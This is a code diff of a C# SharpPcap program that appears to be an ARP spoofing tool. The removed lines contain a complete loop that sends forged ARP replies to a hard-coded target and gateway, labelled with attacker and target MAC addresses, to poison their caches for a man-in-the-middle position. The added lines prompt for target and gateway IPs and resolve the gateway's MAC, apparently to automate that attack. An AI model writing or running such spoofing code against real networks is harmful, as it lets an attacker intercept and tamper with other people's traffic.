@@ -4,11 +4,16 @@ using SharpPcap;
 using SharpPcap.LibPcap;
 using System.Net;
 using System.Net.NetworkInformation;
+using System.Diagnostics;
 
 class Program
 {
+    static string targetMac;
+    static IPAddress gatewayIp;
+    static PhysicalAddress gatewayMac;
     static void Main()
     {
+        Console.Clear();
         var devices = CaptureDeviceList.Instance;
         if (devices.Count < 1)
         {
@@ -34,60 +39,65 @@ class Program
         Console.WriteLine("Using: {0}", device.Name);
         device.Open(DeviceModes.Promiscuous);
 
-        PhysicalAddress attackerMac = device.MacAddress; // ATTACKER MAC ADDRESS
-        PhysicalAddress targetMac = PhysicalAddress.Parse("60-AB-67-E7-17-51"); // TARGET MAC ADDRESS
-        PhysicalAddress gatewayMac = PhysicalAddress.Parse("94-2C-B3-F9-31-2D"); // GATEWAY MAC ADDRESS
+        Console.Write("Enter the target IP address: ");
+        var targetIp = IPAddress.Parse(Console.ReadLine());
 
-        var targetIp = IPAddress.Parse("192.168.0.53"); // TARGET IP
-        var gatewayIp = IPAddress.Parse("192.168.0.1"); // GATEWAY IP
+        Console.Write("Enter the target Gateway IP address: ");
+        gatewayIp = IPAddress.Parse(Console.ReadLine());
 
-        var ethernetPacket = new EthernetPacket(attackerMac, targetMac, EthernetType.Arp);
+        // Get MAC from IP ADDRESS
 
-        while (true)
+        gatewayMac = GetMacFromIp(device, gatewayIp);
+        Console.WriteLine("Gateway MAC: {0}", gatewayMac);
+    }
+
+    static PhysicalAddress GetMacFromIp(ILiveDevice device, IPAddress ip)
+    {
+        var broadcastMac = PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF");
+
+        var stopwatch = new Stopwatch();
+        var arpRequest = new ArpPacket(
+            ArpOperation.Request,
+            broadcastMac,
+            ip,
+            device.MacAddress,
+            gatewayIp
+        );
+
+        var ethernetPacket = new EthernetPacket(device.MacAddress, broadcastMac, EthernetType.Arp);
+        ethernetPacket.PayloadPacket = arpRequest;
+
+        device.SendPacket(ethernetPacket);
+
+        HashSet<string> seenPackets = new HashSet<string>();
+        device.OnPacketArrival += (object s, PacketCapture e) =>
         {
-            try
+            var packet = Packet.ParsePacket(e.GetPacket().LinkLayerType, e.GetPacket().Data);
+            var arpPacket = packet.Extract<ArpPacket>();
+            if (arpPacket != null)
             {
-                var arpReplyToTarget = new ArpPacket(
-                    ArpOperation.Response,
-                    targetMac,
-                    targetIp,
-                    attackerMac,
-                    gatewayIp
-                );
+                var sourceIp = arpPacket.SenderProtocolAddress.ToString();
+                targetMac = arpPacket.SenderHardwareAddress.ToString();
+                var data = arpPacket.Operation;
+                var key = $"{sourceIp} -> {targetMac}";
 
-                ethernetPacket.PayloadPacket = arpReplyToTarget;
-                device.SendPacket(ethernetPacket);
-
-                Console.ForegroundColor = ConsoleColor.Green;
-                Console.WriteLine("--- [SPOOFED REPLY TO TARGET {0}] ARP Packet sent ---", targetIp);
-                Console.ResetColor();
-
-                var arpReplyToGateway = new ArpPacket(
-                    ArpOperation.Response,
-                    gatewayMac,
-                    gatewayIp,
-                    attackerMac,
-                    targetIp
-                );
-
-                ethernetPacket.PayloadPacket = arpReplyToGateway;
-                device.SendPacket(ethernetPacket);
-
-                Console.ForegroundColor = ConsoleColor.Green;
-                Console.WriteLine("--- [SPOOFED REPLY TO GATEWAY {0}] ARP Packet sent ---", gatewayIp);
-                Console.ResetColor();
+                if (!seenPackets.Contains(key))
+                {
+                    seenPackets.Add(key);
+                }
             }
-            catch (Exception ex)
-            {
-                Console.ForegroundColor = ConsoleColor.Green;
-                Console.WriteLine("--- ARP Packet NOT sent ---");
-                Console.WriteLine(ex.Message);
-                Console.ResetColor();
-            }
+        };
 
-            Thread.Sleep(2000);
+        device.StartCapture();
+        stopwatch.Restart();
+        while (stopwatch.ElapsedMilliseconds < 2000)
+        {
+            // Wait
         }
 
-        //device.Close();
+        device.StopCapture();
+        stopwatch.Stop();
+
+        return string.IsNullOrEmpty(targetMac) ? null : PhysicalAddress.Parse(targetMac);
     }
 }
